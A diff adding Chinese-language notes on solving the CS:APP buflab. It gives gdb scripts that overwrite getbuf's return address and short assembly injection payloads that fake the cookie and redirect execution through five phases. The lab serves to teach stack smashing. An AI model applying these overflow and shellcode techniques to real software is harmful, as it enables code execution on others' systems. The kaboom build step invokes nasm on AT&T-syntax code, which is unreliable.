@@ -20,7 +20,249 @@ datalab 的位运算实现应该不止这些，所以当年的实验题库可能
 
 > **忘了×1，应该是缓冲区攻击修改跳转地址？**
 
-乐，这个我好像没写脚本，因为基本都做出来了。
+~~乐，这个我好像没写脚本，因为基本都做出来了。~~
+
+从邮箱里翻到了实验材料，想起来一丢丢了。
+
+此处使用 gdb 调试进行演示，关于如何使用 gdb 请看下面的 lab3。
+
+在以下的部分中，首先使用 gdb 完成全部任务，确定逻辑无误后最后统一打成 hex 流。
+
+> 所有答案对应的汇编代码在 buflab 下提供，直接在 buflab 下执行 make 即可，生成的 .bin 为对应的输入内容，.ans 为对应的十六进制序列。关于更多可运行的只能可以查看 Makefile。
+>
+> 关于如何使用这些汇编代码可以在简单阅读以下的内容后修改位于各个文件头部的几个常量定义即可。
+
+### phase 1 - smoke
+
+bufbomb 执行完 getbuf 后默认的跳转地址在 test 中，完成本关需要修改返回地址到 smoke
+
+i386 函数调用的入栈顺序为：
+
+1. 参数自右向左压栈
+2. 函数返回地址
+3. 当前栈底指针 \$ebp
+
+此处直接定位到 getbuf 的 ret 指令，也即执行完 leave 之后。
+
+leave 指令等效于 `mov %ebp, %esp; pop %ebp`，故到达 ret 时栈顶指针 $esp 将指向返回地址。
+
+```gdb
+b *(getbuf+21)
+c
+set *(void**)$esp=smoke
+c
+```
+
+### phase 2 - fizz
+
+查看 fizz 反汇编，不难得其要求一个参数，该参数将与 cookie 比较，相等时通过。
+
+使用 `makecookie <你的学号>` 得到你的 cookie，此处假设为 0x7d97e567。
+
+```gdb
+b *(getbuf+21)
+c
+set *(void**)$esp=fizz
+b *(fizz+9)
+c
+set $eax=0x7d97e567
+c
+```
+
+### phase 3 - bang
+
+本例中，将 0x804d138 <global_value> 与 cookie 作比较，故关键点就是找到设置全局变量的方法。
+
+可以尝试看看 bufbomb 的反汇编有没有设置 global_value 的方法：
+
+`objdump -D bufbomb | grep 0x804d138`
+
+你大概会发现出现 0x804d138 的地方就那么一处，所以想套现成的方法是行不通了。
+
+代码段是肯定改不了了，但是所幸跳转指令（此处指 ret）非常有操作空间！
+
+故可以将 getbuf 的返回地址设置为 getbuf 的缓冲区基址，并向缓冲区填充赋值 global_value 与跳转至 bang 的代码。
+
+编写汇编保存为 solve-bang.s：
+
+```assembly
+mov $0x7d97e567, %eax
+mov %eax, 0x804d138
+push $0x8048c55
+ret
+```
+
+使用以下命令得到缓冲区的指令与十六进制序列：
+
+```sh
+gcc -c solve-bang.s
+objcopy -O binary -j .text solve-bang.o solve-bang.bin
+xxd -c 8 -g 1 solve-bang.bin | cut -d ' ' -f 2-9 > solve-bang.hex
+```
+
+将 solve-bang.bin 输入并运行，重新启动 gdb 调试运行以下命令，通过。
+
+```gdb
+b *(getbuf+9)
+c
+printf "dest ret addr: %#lx\n", $eax
+b *(getbuf+20)
+c
+x /4i $ebp-0x28
+set $eax=$ebp-0x28
+b *(getbuf+21)
+c
+set *(void**)$esp=$eax
+c
+```
+
+> "dest ret addr: ..." 输出的地址为缓冲区基地址，即 getbuf 需要的返回地址。
+
+### phase 4 - boom
+
+本例中 getbuf 需要跳转到 test 方法中，其中 test 将检测堆栈状态并对 getbuf 的返回值与 cookie 进行判定。
+
+重新描述下，也即 getbuf 需要在不破坏堆栈状态的情况下设置返回值并返回，也即**最完美的实现应当是与调用方是否为 test 无关**。
+
+比照 phase 3，该任务只需要想办法备份进入 getbuf 时的返回地址即可。
+
+但是很显然，采取攻击需要覆写返回地址，不覆写地址就无法完成攻击。
+
+故而上面提到的所谓**最完美的实现**应当是做不到的，所以还是得查 test 调用 getbuf 时的返回地址并硬编码。
+
+> 断言且实际真的能够做到的神们请提前受我一拜！
+
+另一个部分是恢复栈帧，也即 \$ebp 和 \$esp 的值。其中 \$esp 的值在该攻击中并不受影响，故只需恢复 \$ebp 的值。
+
+在进入函数时会有一次 `mov %ebp, %esp`，故在 getbuf 函数中关于 \$ebp 的线索的来源只有 \$esp。
+
+但在 leave 指令后栈帧恢复，\$esp 不再持有旧 \$ebp 的值，所以在 getbuf 函数中是找不到答案的，只能去 getbuf 的调用方 test 函数内找答案。
+
+反汇编 test 函数得到以下内容（部分）：
+
+```asm
+push   %ebp
+mov    %esp,%ebp
+push   %ebx
+sub    $0x14,%esp
+call   8048d41 <uniqueval>
+mov    %eax,-0xc(%ebp)
+call   80491c1 <getbuf>
+...
+```
+
+可以看到到调用 getbuf 为止共开辟了 0x14 字节的栈上空间，而在调用 getbuf 之后 ebp 指针压栈，此时存在 `$esp+0x18==$ebp`。
+
+到此答案已经知晓了，只需要将 \$ebp 恢复至进入 getbuf 时 \$esp+0x18 即可（也即 leave 之后的 \$esp 值）。
+
+```gdb
+b *(getbuf+9)
+c
+printf "origin ret addr: %#lx\n", *(void**)($ebp+4)
+printf "dest ret addr: %#lx\n", $eax
+b *(getbuf+20)
+c
+x /3i $ebp-0x28
+set $eax=$ebp-0x28
+b *(getbuf+21)
+set *(void**)$esp=$eax
+c
+```
+
+> "origin ret addr: ..." 为 getbuf 原返回地址。
+
+> 不管缓冲区地址变不变，上面这段 gdb 指令一定是可以 pass 的，毕竟拿的栈帧总是当前的栈帧而不是硬编码，下一个 kaboom 也是一样。
+
+### phase 5 - kaboom
+
+kaboom 启动需要加个 -n 参数，跟 boom 唯一的区别就是 test 换成了 testn，getbuf 换成了 getbufn。
+
+抓关键来说，就是从一次 test 判断变成了 5 次 testn 判断，每次判断的逻辑不变。
+
+简单观察下反汇编可以知道 getbufn 和 testn 都只在一个地方调用，所以 getbufn 返回 testn 的返回地址一定是固定的。
+
+而一般情况下只要不整什么花活比如**栈上动态分配内存但是不释放**或者**内联汇编移动栈指针**，那 getbufn 在栈上开辟的缓冲区地址都是不会变的。
+
+但是问题来了，它实际上是变动的！
+
+若不考虑地址的变动问题，答案显而易见，把 phase 4 的攻击代码改改参数重复个 5 遍就行了。
+
+由于 5 次 testn 调用相当于 5 次 getbufn 调用相当于 5 次读入，所以需要稍稍改改对应的代码。
+
+编写仅供 gdb 调试用的 solve-kabomb.s 程序：
+
+```assembly
+.rept 5
+    mov $0x7d97e567, %eax
+    push $0x8048de5
+    ret
+
+    .byte 0x0a
+.endr
+```
+
+> 以上代码不含栈帧恢复
+
+前 3 条指令与 phase 4 逻辑一致，第四条 `db 0x0a` 定义了 1 字节值为 0x0a 的数据，即 '\n'，这被视为终止符结束一次 getbufn 输入。
+
+> 使用的均为 AT&T 汇编，可以直接使用 gcc 或 as 进行编译。
+
+编译指令：
+
+```assembly
+nasm solve-kabomb.s -f elf
+objcopy -O binary -j .text solve-kabomb.o solve-kabomb.bin
+```
+
+将 solve-kabomb.bin 指定为输入并重新启动：
+
+```gdb
+b *(getbufn+26)
+b *(getbufn+27)
+define solve_once
+set $eax=$ebp-0x208
+printf "current dest ret addr: %#lx\n", $eax
+c
+set *(void**)$esp=$eax
+c
+end
+c
+solve_once
+solve_once
+solve_once
+solve_once
+solve_once
+```
+
+**再考虑缓冲区地址改变的情况**
+
+做出一个假设：缓冲区基址变了，但是并没有变太多。
+
+通过前面的 gdb 调试可以看到 5 次调用的缓冲区基址，例如以下序列：
+
+```plain
+0x556832c8
+0x55683248
+0x55683328
+0x55683318
+0x55683258
+```
+
+计算极值差得到 224 字节，然而 getbufn 的缓冲区大小为 512 字节，几乎是地址最大浮动的 2 倍！
+
+**那么硬编码也不是不行嘛，大不了浪费一些缓冲区空间就是了**
+
+解决方案如下：
+
+调试得到 5 次调用的缓冲区地址，最大值记为 M，最小值记为 m，攻击代码（不含覆盖返回地址的 8 字节）长度为 l。
+
+> 如果 M - m + l > 512 就自求多福吧，可能上天就是不想让你过这课。
+
+若 getbufn 的跳转地址为 p，攻击代码的填充位置为 q，则应满足 M <= p <= p + l <= m + 512，0 <= q < q + l < 512。
+
+**不妨令攻击代码填充在缓冲区末尾，令跳转位置为最大缓冲区地址。**
+
+关于栈帧恢复的部分与 boom 一致，由于 testn 中只调用了一次 getbufn，所以旧 \$ebp 的值也是固定的为 \$esp+0x18。
 
 ## lab3 bomblab
 
